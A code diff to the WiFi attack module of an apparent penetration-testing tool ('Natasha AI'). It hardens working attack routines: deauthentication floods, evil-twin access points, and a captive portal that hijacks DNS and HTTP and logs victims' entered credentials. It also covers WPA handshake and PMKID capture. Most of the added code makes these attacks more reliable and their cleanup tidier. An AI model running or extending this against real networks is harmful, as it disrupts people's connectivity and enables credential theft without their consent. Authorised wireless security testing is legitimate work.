@@ -20,6 +20,7 @@ import re
 import json
 import random
 import tempfile
+import shutil
 from typing import Dict, List, Tuple, Optional, Union, Any
 from enum import Enum
 
@@ -91,6 +92,121 @@ class AttackType(Enum):
 class WiFiAttack:
     """WiFi attack module for Natasha AI Penetration Testing Tool."""
     
+    def _load_network_config(self) -> None:
+        """Load network configuration from ~/natasha/config.json if present."""
+        try:
+            cfg_path = os.path.join(os.path.expanduser("~"), "natasha", "config.json")
+            if not os.path.exists(cfg_path):
+                # Defaults
+                self.net_cfg = {
+                    "network": {
+                        "captive_portal": {
+                            "gateway_ip": "192.168.1.1",
+                            "subnet_cidr": "192.168.1.1/24",
+                            "netmask": "255.255.255.0",
+                            "dhcp_range_start": "192.168.1.2",
+                            "dhcp_range_end": "192.168.1.30",
+                            "dns": "8.8.8.8",
+                            # "outbound_iface": "eth0"  # optional override
+                        }
+                    }
+                }
+                return
+            with open(cfg_path, 'r') as f:
+                data = json.load(f)
+            # Merge with defaults conservatively
+            defaults = {
+                "network": {
+                    "captive_portal": {
+                        "gateway_ip": "192.168.1.1",
+                        "subnet_cidr": "192.168.1.1/24",
+                        "netmask": "255.255.255.0",
+                        "dhcp_range_start": "192.168.1.2",
+                        "dhcp_range_end": "192.168.1.30",
+                        "dns": "8.8.8.8",
+                    }
+                }
+            }
+            # Shallow merge for our keys
+            cfg = defaults
+            try:
+                cp = data.get('network', {}).get('captive_portal', {})
+                for k, v in cp.items():
+                    cfg['network']['captive_portal'][k] = v
+            except Exception:
+                pass
+            self.net_cfg = cfg
+            logging.info("Loaded network configuration for captive portal")
+        except Exception as e:
+            logging.warning(f"Failed to load network config, using defaults: {e}")
+            self.net_cfg = {
+                "network": {
+                    "captive_portal": {
+                        "gateway_ip": "192.168.1.1",
+                        "subnet_cidr": "192.168.1.1/24",
+                        "netmask": "255.255.255.0",
+                        "dhcp_range_start": "192.168.1.2",
+                        "dhcp_range_end": "192.168.1.30",
+                        "dns": "8.8.8.8",
+                    }
+                }
+            }
+
+    def _snapshot_network_services(self) -> None:
+        """Snapshot state of common network services to restore later.
+        Records services that are currently active.
+        """
+        try:
+            candidates = [
+                "NetworkManager",
+                "wpa_supplicant",
+                "dhcpcd",
+                "networking",
+                "iwd",
+                "avahi-daemon",
+            ]
+            self._services_to_restore = []
+            # Prefer systemctl if available
+            use_systemctl = shutil.which("systemctl") is not None
+            for svc in candidates:
+                try:
+                    if use_systemctl:
+                        proc = subprocess.run(["systemctl", "is-active", svc], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                        if proc.returncode == 0 and proc.stdout.decode().strip() == "active":
+                            self._services_to_restore.append(svc)
+                    else:
+                        # Fallback: best-effort check via service status
+                        proc = subprocess.run(["service", svc, "status"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                        out = (proc.stdout.decode(errors="ignore") + proc.stderr.decode(errors="ignore")).lower()
+                        if "running" in out or "started" in out:
+                            self._services_to_restore.append(svc)
+                except Exception:
+                    continue
+            if self._services_to_restore:
+                logging.info(f"Will attempt to restore services after monitor mode: {', '.join(self._services_to_restore)}")
+        except Exception as e:
+            logging.debug(f"Service snapshot failed: {e}")
+
+    def _restore_network_services(self) -> None:
+        """Attempt to restore network services that were active before monitor-mode work."""
+        try:
+            if not self._services_to_restore:
+                return
+            use_systemctl = shutil.which("systemctl") is not None
+            for svc in self._services_to_restore:
+                try:
+                    if use_systemctl:
+                        subprocess.run(["systemctl", "start", svc], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    else:
+                        subprocess.run(["service", svc, "start"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    logging.info(f"Restored service: {svc}")
+                except Exception as e:
+                    logging.warning(f"Failed to restore service {svc}: {e}")
+            # Clear after restore attempt
+            self._services_to_restore = []
+        except Exception as e:
+            logging.debug(f"Service restore failed: {e}")
+
     def __init__(self, interface_name: str = "wlan1"):
         """Initialize the WiFi attack module.
         
@@ -116,6 +232,12 @@ class WiFiAttack:
         self.wps_enabled_networks = {}
         self.hidden_networks = {}
         self.scan_history = []
+        # Saved managed-mode interface state (addresses/up/down)
+        self._iface_saved_state = None
+        # Track services to restore after monitor-mode operations
+        self._services_to_restore: List[str] = []
+        # Network configuration (loaded from ~/natasha/config.json if present)
+        self.net_cfg: Dict[str, Any] = {}
         
         # Ensure directories exist
         os.makedirs(self.capture_dir, exist_ok=True)
@@ -123,6 +245,11 @@ class WiFiAttack:
         
         # Initialize the interface
         self._init_interface()
+        # Load network configuration after interface init
+        try:
+            self._load_network_config()
+        except Exception:
+            pass
     
     def _init_interface(self) -> None:
         """Initialize the WiFi interface."""
@@ -185,25 +312,132 @@ class WiFiAttack:
             return interfaces
         except subprocess.CalledProcessError:
             return []
+
+    def _require_root(self, op: str) -> bool:
+        try:
+            if os.geteuid() != 0:
+                logging.error(f"{op} requires root privileges (run as root/sudo).")
+                return False
+        except Exception:
+            # Environments missing geteuid
+            pass
+        return True
+
+    def _require_tools(self, tools: List[str]) -> bool:
+        missing: List[str] = []
+        for t in tools:
+            try:
+                if shutil.which(t) is None:
+                    missing.append(t)
+            except Exception:
+                missing.append(t)
+        if missing:
+            logging.error(f"Missing required tools: {', '.join(missing)}")
+            return False
+        return True
+
+    def _precheck(self, operation: str, tools: List[str]) -> bool:
+        """Centralized precheck for privileged operations and required tools.
+        Logs consistent errors and fails fast.
+        """
+        if not self._require_root(operation):
+            return False
+        if tools and not self._require_tools(tools):
+            return False
+        return True
+
+    def _detect_outbound_interface(self) -> str:
+        """Detect the default outbound interface for NAT.
+        Returns a device name (e.g., 'eth0'). Falls back to 'eth0'. Honors config override."""
+        # Config override if provided
+        try:
+            cfg_iface = (
+                self.net_cfg.get('network', {})
+                .get('captive_portal', {})
+                .get('outbound_iface')
+            )
+            if cfg_iface and isinstance(cfg_iface, str):
+                return cfg_iface
+        except Exception:
+            pass
+        try:
+            out = subprocess.check_output(["ip", "route", "show", "default"], stderr=subprocess.STDOUT).decode('utf-8', errors='ignore')
+            tokens = out.split()
+            if "dev" in tokens:
+                idx = tokens.index("dev")
+                if idx + 1 < len(tokens):
+                    return tokens[idx + 1]
+        except Exception:
+            pass
+        return "eth0"
     
     def _get_interface_mac(self, interface_name: str) -> str:
-        """Get the MAC address of a network interface.
-        
-        Args:
-            interface_name: Name of the interface
-            
-        Returns:
-            MAC address as a string
-        """
+        """Get the MAC address of a network interface."""
         try:
-            output = subprocess.check_output(["ip", "link", "show", interface_name], 
-                                           stderr=subprocess.STDOUT).decode('utf-8')
+            output = subprocess.check_output(["ip", "link", "show", interface_name], stderr=subprocess.STDOUT).decode('utf-8')
             match = re.search(r'link/ether\s+([0-9a-f:]{17})', output)
-            if match:
-                return match.group(1)
-            return ""
+            return match.group(1) if match else ""
         except subprocess.CalledProcessError:
             return ""
+
+    def _snapshot_interface_state(self) -> None:
+        """Snapshot current managed-mode interface state (addresses, up/down)."""
+        try:
+            # Only snapshot once per enable cycle
+            if self._iface_saved_state is not None:
+                return
+            name = self.interface.name if self.interface else self.interface_name
+            up = False
+            try:
+                link_out = subprocess.check_output(["ip", "link", "show", name], stderr=subprocess.STDOUT).decode('utf-8', errors='ignore')
+                up = "state UP" in link_out or "UP" in link_out.splitlines()[0]
+            except Exception:
+                up = False
+            addrs: List[str] = []
+            try:
+                addr_out = subprocess.check_output(["ip", "addr", "show", "dev", name], stderr=subprocess.STDOUT).decode('utf-8', errors='ignore')
+                for line in addr_out.splitlines():
+                    line = line.strip()
+                    if line.startswith("inet "):
+                        parts = line.split()
+                        if len(parts) >= 2:
+                            addrs.append(parts[1])  # e.g., 192.168.1.5/24
+            except Exception:
+                pass
+            self._iface_saved_state = {"name": name, "up": up, "addrs": addrs}
+            logging.debug(f"Snapshot interface state: up={up}, addrs={addrs}")
+        except Exception as e:
+            logging.debug(f"Failed to snapshot interface state: {e}")
+
+    def _restore_interface_state(self) -> None:
+        """Restore previously saved managed-mode interface state."""
+        try:
+            if not self._iface_saved_state:
+                return
+            name = self._iface_saved_state.get("name", self.interface_name)
+            # Bring down and flush
+            try:
+                subprocess.run(["ip", "link", "set", name, "down"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                subprocess.run(["ip", "addr", "flush", "dev", name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            except Exception:
+                pass
+            # Re-add saved addresses
+            for cidr in self._iface_saved_state.get("addrs", []):
+                try:
+                    subprocess.run(["ip", "addr", "add", cidr, "dev", name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                except Exception as e:
+                    logging.debug(f"Failed to restore addr {cidr} on {name}: {e}")
+            # Bring up if previously up
+            if self._iface_saved_state.get("up"):
+                try:
+                    subprocess.run(["ip", "link", "set", name, "up"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                except Exception:
+                    pass
+            # Clear saved state
+            self._iface_saved_state = None
+            logging.info("Interface state restored to managed configuration")
+        except Exception as e:
+            logging.debug(f"Failed to restore interface state: {e}")
     
     def _enable_monitor_mode(self) -> bool:
         """Enable monitor mode on the WiFi interface.
@@ -214,6 +448,9 @@ class WiFiAttack:
         if self.monitor_interface is not None:
             logging.info(f"Monitor mode already enabled on {self.monitor_interface.name}")
             return True
+        
+        if not self._require_root("Enable monitor mode"):
+            return False
         
         try:
             # Check if airmon-ng is available
@@ -227,7 +464,14 @@ class WiFiAttack:
                 # Use airmon-ng to enable monitor mode
                 logging.info(f"Enabling monitor mode on {self.interface.name} using airmon-ng")
                 
-                # Kill interfering processes
+                # Snapshot current state before changing mode
+                self._snapshot_interface_state()
+
+                # Snapshot active network services to restore later
+                self._snapshot_network_services()
+                
+                # Kill interfering processes (may stop network managers)
+                logging.info("airmon-ng check kill may stop network services (NetworkManager, wpa_supplicant)")
                 subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 
                 # Start monitor mode
@@ -257,17 +501,20 @@ class WiFiAttack:
                 # Use iw to enable monitor mode
                 logging.info(f"Enabling monitor mode on {self.interface.name} using iw")
                 
+                # Snapshot current state before changing mode
+                self._snapshot_interface_state()
+                
                 # Bring down the interface
                 subprocess.run(["ip", "link", "set", self.interface.name, "down"], 
-                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                             check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 
                 # Set monitor mode
                 subprocess.run(["iw", "dev", self.interface.name, "set", "monitor", "none"], 
-                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                             check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 
                 # Bring up the interface
                 subprocess.run(["ip", "link", "set", self.interface.name, "up"], 
-                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                             check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 
                 # Verify monitor mode
                 output = subprocess.check_output(["iw", "dev", self.interface.name, "info"], 
@@ -313,24 +560,50 @@ class WiFiAttack:
                 
                 # Bring down the interface
                 subprocess.run(["ip", "link", "set", self.monitor_interface.name, "down"], 
-                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                             check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 
                 # Set managed mode
                 subprocess.run(["iw", "dev", self.monitor_interface.name, "set", "type", "managed"], 
-                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                             check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 
                 # Bring up the interface
                 subprocess.run(["ip", "link", "set", self.monitor_interface.name, "up"], 
-                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                             check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             
             # Reset monitor interface
             self.monitor_interface = None
+            # Restore previous managed state (addresses/up)
+            self._restore_interface_state()
             logging.info("Monitor mode disabled")
             return True
         except Exception as e:
             logging.error(f"Failed to disable monitor mode: {e}")
             return False
     
+    def _ensure_managed_mode(self) -> bool:
+        """Ensure the wireless interface is in managed mode (not monitor).
+        Returns True if managed mode is ready, False otherwise.
+        """
+        try:
+            # If monitor mode is active, disable it to restore managed mode
+            if self.monitor_interface is not None:
+                ok = self._disable_monitor_mode()
+                if not ok:
+                    return False
+            # Verify interface exists and is up
+            if not self.interface or not self._interface_exists(self.interface.name):
+                logging.error("Managed interface not available after disabling monitor mode")
+                return False
+            # Try to ensure it's up
+            try:
+                subprocess.run(["ip", "link", "set", self.interface.name, "up"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            except Exception:
+                pass
+            return True
+        except Exception as e:
+            logging.error(f"Failed to ensure managed mode: {e}")
+            return False
+
     def scan_networks(self, duration: int = 30) -> Dict[str, AccessPoint]:
         """Scan for WiFi networks.
         
@@ -341,6 +614,11 @@ class WiFiAttack:
             Dictionary of access points (BSSID -> AccessPoint)
         """
         with self.lock:
+            # Privilege/tool checks
+            if not self._require_root("Scan networks"):
+                return {}
+            if not self._require_tools(["airodump-ng"]):
+                return {}
             # Clear previous scan results
             self.access_points = {}
             self.clients = {}
@@ -569,6 +847,8 @@ class WiFiAttack:
             True if successful, False otherwise
         """
         with self.lock:
+            if not self._precheck("Deauthentication (client)", ["aireplay-ng", "iw"]):
+                return False
             # Enable monitor mode
             if not self._enable_monitor_mode():
                 logging.error("Failed to enable monitor mode for deauth attack")
@@ -585,7 +865,7 @@ class WiFiAttack:
                 
                 # Set channel
                 subprocess.run(["iw", "dev", self.monitor_interface.name, "set", "channel", str(channel)], 
-                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                             check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 
                 # Send deauth packets
                 logging.info(f"Sending {count} deauth packets to {client_mac} from AP {ap_bssid}")
@@ -615,6 +895,8 @@ class WiFiAttack:
             True if successful, False otherwise
         """
         with self.lock:
+            if not self._precheck("Deauthentication (network)", ["aireplay-ng", "iw"]):
+                return False
             # Enable monitor mode
             if not self._enable_monitor_mode():
                 logging.error("Failed to enable monitor mode for deauth attack")
@@ -631,7 +913,7 @@ class WiFiAttack:
                 
                 # Set channel
                 subprocess.run(["iw", "dev", self.monitor_interface.name, "set", "channel", str(channel)], 
-                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                             check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 
                 # Send broadcast deauth packets
                 logging.info(f"Sending {count} broadcast deauth packets for AP {ap_bssid}")
@@ -661,8 +943,15 @@ class WiFiAttack:
             True if successful, False otherwise
         """
         with self.lock:
+            if not self._precheck("Evil twin AP", ["hostapd", "ip", "iw"]):
+                return False
             # Stop any running attacks
             self.stop_attack()
+
+            # Ensure interface is in managed mode (hostapd requires managed)
+            if not self._ensure_managed_mode():
+                logging.error("Cannot start AP: failed to switch to managed mode")
+                return False
             
             try:
                 # Create hostapd configuration
@@ -747,8 +1036,15 @@ wpa_passphrase={wpa_passphrase}
             True if successful, False otherwise
         """
         with self.lock:
+            if not self._precheck("Captive portal", ["hostapd", "dnsmasq", "iptables", "php", "sysctl", "ip"]):
+                return False
             # Stop any running attacks
             self.stop_attack()
+
+            # Ensure interface is in managed mode (hostapd requires managed)
+            if not self._ensure_managed_mode():
+                logging.error("Cannot start captive portal: failed to switch to managed mode")
+                return False
             
             try:
                 # Create hostapd configuration
@@ -767,18 +1063,33 @@ ignore_broadcast_ssid=0
                 with open(hostapd_conf_file, 'w') as f:
                     f.write(hostapd_conf)
                 
+                # Refresh network configuration
+                try:
+                    self._load_network_config()
+                except Exception:
+                    pass
+                cp_cfg = self.net_cfg.get('network', {}).get('captive_portal', {})
+                gateway_ip = cp_cfg.get('gateway_ip', '192.168.1.1')
+                subnet_cidr = cp_cfg.get('subnet_cidr', f"{gateway_ip}/24")
+                netmask = cp_cfg.get('netmask', '255.255.255.0')
+                dhcp_start = cp_cfg.get('dhcp_range_start', '192.168.1.2')
+                dhcp_end = cp_cfg.get('dhcp_range_end', '192.168.1.30')
+                dns_server = cp_cfg.get('dns', '8.8.8.8')
+
                 # Create dnsmasq configuration
-                dnsmasq_conf = """
-interface={}
-dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
-dhcp-option=3,192.168.1.1
-dhcp-option=6,192.168.1.1
-server=8.8.8.8
+                dnsmasq_conf = f"""
+interface={self.interface.name}
+bind-interfaces
+no-dhcp-interface=lo
+dhcp-range={dhcp_start},{dhcp_end},{netmask},12h
+dhcp-option=3,{gateway_ip}
+dhcp-option=6,{gateway_ip}
+server={dns_server}
 log-queries
 log-dhcp
-listen-address=127.0.0.1
-address=/#/192.168.1.1
-""".format(self.interface.name)
+listen-address={gateway_ip}
+address=/#/{gateway_ip}
+"""
                 
                 # Write configuration to temporary file
                 dnsmasq_conf_file = os.path.join(tempfile.gettempdir(), "natasha_dnsmasq.conf")
@@ -787,31 +1098,46 @@ address=/#/192.168.1.1
                 
                 # Configure interface
                 subprocess.run(["ip", "link", "set", self.interface.name, "down"], 
-                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                             check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 subprocess.run(["ip", "addr", "flush", "dev", self.interface.name], 
-                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                subprocess.run(["ip", "addr", "add", "192.168.1.1/24", "dev", self.interface.name], 
-                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                             check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                subprocess.run(["ip", "addr", "add", subnet_cidr, "dev", self.interface.name], 
+                             check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 subprocess.run(["ip", "link", "set", self.interface.name, "up"], 
-                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                             check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 
+                # Snapshot current IP forwarding state
+                ip_forward_prev = None
+                try:
+                    ip_forward_prev = subprocess.check_output(["sysctl", "-n", "net.ipv4.ip_forward"], stderr=subprocess.STDOUT).decode('utf-8').strip()
+                except Exception:
+                    pass
+
                 # Enable IP forwarding
                 subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], 
-                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                             check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 
-                # Configure iptables
-                subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE"], 
-                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                subprocess.run(["iptables", "-A", "FORWARD", "-i", self.interface.name, "-o", "eth0", "-j", "ACCEPT"], 
-                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                subprocess.run(["iptables", "-A", "FORWARD", "-i", "eth0", "-o", self.interface.name, "-m", "state", 
+                # Configure iptables (track rules for rollback)
+                out_iface = self._detect_outbound_interface()
+                iptables_rules: List[List[str]] = []
+                subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", out_iface, "-j", "MASQUERADE"], 
+                             check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                iptables_rules.append(["-t", "nat", "-D", "POSTROUTING", "-o", out_iface, "-j", "MASQUERADE"])
+                subprocess.run(["iptables", "-A", "FORWARD", "-i", self.interface.name, "-o", out_iface, "-j", "ACCEPT"], 
+                             check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                iptables_rules.append(["-D", "FORWARD", "-i", self.interface.name, "-o", out_iface, "-j", "ACCEPT"])
+                subprocess.run(["iptables", "-A", "FORWARD", "-i", out_iface, "-o", self.interface.name, "-m", "state", 
                               "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"], 
-                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                             check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                iptables_rules.append(["-D", "FORWARD", "-i", out_iface, "-o", self.interface.name, "-m", "state", 
+                              "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"])
                 
                 # Redirect all HTTP traffic to captive portal
                 subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", self.interface.name, 
-                              "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "192.168.1.1:80"], 
-                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                              "-p", "tcp", "--dport", "80", "-j", "DNAT", f"--to-destination", f"{gateway_ip}:80"], 
+                             check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                iptables_rules.append(["-t", "nat", "-D", "PREROUTING", "-i", self.interface.name, 
+                              "-p", "tcp", "--dport", "80", "-j", "DNAT", f"--to-destination", f"{gateway_ip}:80"])
                 
                 # Start hostapd
                 logging.info(f"Starting captive portal with SSID '{ssid}' on channel {channel}")
@@ -934,7 +1260,7 @@ file_put_contents('credentials.log', $log_entry, FILE_APPEND);
                 
                 # Start PHP web server
                 php_process = subprocess.Popen(
-                    ["php", "-S", "192.168.1.1:80", "-t", portal_dir],
+                    ["php", "-S", f"{gateway_ip}:80", "-t", portal_dir],
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE
                 )
@@ -961,7 +1287,9 @@ file_put_contents('credentials.log', $log_entry, FILE_APPEND);
                     "dnsmasq_process": dnsmasq_process,
                     "php_process": php_process,
                     "hostapd_conf_file": hostapd_conf_file,
-                    "dnsmasq_conf_file": dnsmasq_conf_file
+                    "dnsmasq_conf_file": dnsmasq_conf_file,
+                    "iptables_rules": iptables_rules,
+                    "ip_forward_prev": ip_forward_prev
                 }
                 
                 logging.info(f"Captive portal with SSID '{ssid}' started successfully")
@@ -982,6 +1310,8 @@ file_put_contents('credentials.log', $log_entry, FILE_APPEND);
             True if successful, False otherwise
         """
         with self.lock:
+            if not self._precheck("Handshake capture", ["airodump-ng", "iw"]):
+                return False
             # Stop any running attacks
             self.stop_attack()
             
@@ -1050,6 +1380,8 @@ file_put_contents('credentials.log', $log_entry, FILE_APPEND);
             True if successful, False otherwise
         """
         with self.lock:
+            if not self._precheck("PMKID attack", ["hcxdumptool", "iw"]):
+                return False
             # Stop any running attacks
             self.stop_attack()
             
@@ -1059,13 +1391,6 @@ file_put_contents('credentials.log', $log_entry, FILE_APPEND);
                 return False
             
             try:
-                # Check if hcxdumptool is available
-                try:
-                    subprocess.check_output(["which", "hcxdumptool"], stderr=subprocess.STDOUT)
-                except subprocess.CalledProcessError:
-                    logging.error("hcxdumptool not found. Please install it first.")
-                    return False
-                
                 # Create output directory
                 capture_dir = os.path.join(self.capture_dir, "pmkid")
                 os.makedirs(capture_dir, exist_ok=True)
@@ -1130,6 +1455,8 @@ file_put_contents('credentials.log', $log_entry, FILE_APPEND);
             True if successful, False otherwise
         """
         with self.lock:
+            if not self._precheck("Passive monitor", ["airodump-ng", "iw"]):
+                return False
             # Stop any running attacks
             self.stop_attack()
             
@@ -1209,7 +1536,10 @@ file_put_contents('credentials.log', $log_entry, FILE_APPEND);
                     # Remove configuration file
                     conf_file = self.attack_status.get("conf_file")
                     if conf_file and os.path.exists(conf_file):
-                        os.unlink(conf_file)
+                        try:
+                            os.unlink(conf_file)
+                        except Exception:
+                            pass
                 
                 elif attack_type == AttackType.CAPTIVE_PORTAL.value:
                     # Stop hostapd
@@ -1233,19 +1563,32 @@ file_put_contents('credentials.log', $log_entry, FILE_APPEND);
                     # Remove configuration files
                     hostapd_conf_file = self.attack_status.get("hostapd_conf_file")
                     if hostapd_conf_file and os.path.exists(hostapd_conf_file):
-                        os.unlink(hostapd_conf_file)
+                        try:
+                            os.unlink(hostapd_conf_file)
+                        except Exception:
+                            pass
                     
                     dnsmasq_conf_file = self.attack_status.get("dnsmasq_conf_file")
                     if dnsmasq_conf_file and os.path.exists(dnsmasq_conf_file):
-                        os.unlink(dnsmasq_conf_file)
+                        try:
+                            os.unlink(dnsmasq_conf_file)
+                        except Exception:
+                            pass
                     
-                    # Reset iptables
-                    subprocess.run(["iptables", "-F"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                    subprocess.run(["iptables", "-t", "nat", "-F"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    # Remove iptables rules added during attack
+                    rules = self.attack_status.get("iptables_rules", [])
+                    for r in rules:
+                        try:
+                            subprocess.run(["iptables"] + r, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                        except Exception:
+                            pass
                     
-                    # Disable IP forwarding
-                    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], 
-                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    # Restore previous IP forwarding state
+                    ip_forward_prev = self.attack_status.get("ip_forward_prev")
+                    if ip_forward_prev is not None:
+                        subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={ip_forward_prev}"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    else:
+                        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 
                 elif attack_type in [AttackType.HANDSHAKE_CAPTURE.value, AttackType.PASSIVE_MONITOR.value]:
                     # Stop airodump-ng
@@ -1339,6 +1682,9 @@ file_put_contents('credentials.log', $log_entry, FILE_APPEND);
             
             # Disable monitor mode
             self._disable_monitor_mode()
+
+            # Attempt to restore previously active network services
+            self._restore_network_services()
             
             logging.info("WiFi attack module cleaned up")
 
